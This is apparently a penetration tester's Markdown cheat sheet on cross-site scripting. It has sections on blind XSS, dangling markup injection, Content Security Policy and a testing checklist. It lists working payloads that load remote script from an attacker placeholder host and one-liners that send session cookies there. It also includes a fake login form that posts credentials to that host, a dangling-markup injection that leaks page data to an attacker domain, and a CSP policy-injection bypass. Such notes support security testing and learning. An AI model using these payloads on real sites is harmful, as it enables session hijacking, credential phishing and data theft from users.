# Cross-Site Scripting
- [Blind XSS](#blind-xss)
- [Dangling Markup Injection](#dangling-markup-injection)
- [Content Security Policy (CSP)](#content-security-policy-csp)
- [Testing](#testing)


> [!NOTE]
> XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).


## Blind XSS
- A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to. Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

    - Contact Forms
    - Reviews
    - User Details
    - Support Tickets
    - HTTP User-Agent header

- Payloads trigger Blind XSS:
    - [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
```javascript
<script src='http://OUR_IP'></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

- Grab the cookies:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

- **Phishing**
    - Login form
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

## Dangling Markup injection
- Dangling Markup Injection
    - It's a technique hackers use to grab sensitive data from websites in cases where a full-fledged cross-site scripting (XSS) attack isn't an option.

- **How Does It Work?**
    - Imagine a website takes some user input and includes it directly in its HTML code, like this: `<input type="text" name="input" value="USER DATA HERE">`

    - If regular XSS is blocked (due to filters or security policies), the attacker might use dangling markup. They inject something like this: `"><img src='//attacker-website.com?`

    - It begins defining a `src` (source) attribute but leaves it incomplete (or "dangling").
    - The browser will keep looking for where the attribute ends, and during this process, it may accidentally include part of the webpage's response as part of the URL.
    - Anything following the injection point in the webpage's response, like CSRF tokens or user data, might be sent to the attacker's server.

## Content Security Policy (CSP)
- CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. 
- It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.

- To enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.

```javascript
# Directive will only allow scripts to be loaded from the same origin as the page itself: 
script-src 'self'
# Directive will only allow scripts to be loaded from a specific domain:
script-src https://scripts.normal-website.com
```

- CSP also provides two other ways of specifying trusted resources:
    1. The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker.

    2. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.


- **Bypassing CSP with policy injection**
    - You may encounter a website that reflects input into the actual policy, most likely in a `report-uri` directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. 
    - Usually, this `report-uri` directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.
    - `https://WEBSITE/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`

## Testing 
- [ ] Check for any reflection

- [ ] XSS context is inside a quoted string literal
    - [ ] `'-alert(document.domain)-'`
    - [ ] `';alert(document.domain)//`

- [ ] Hidden inputs
    - [ ] Check for href in canonical link tag `<link rel="canonical" href='http://WEBSITE/?'accesskey='x'onclick='alert(1)'/>`
    - [ ] Check forms `<input type="hidden" accesskey="x" onclick="alert(1)">`

- [ ] Check for CSTI (Angularjs, Vuejs)
- [ ] Check for DOM XSS (using DOM invader)


- [XSS Filter bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md#bypass-using-bom)



- **Resources** 
    - [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
    - [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
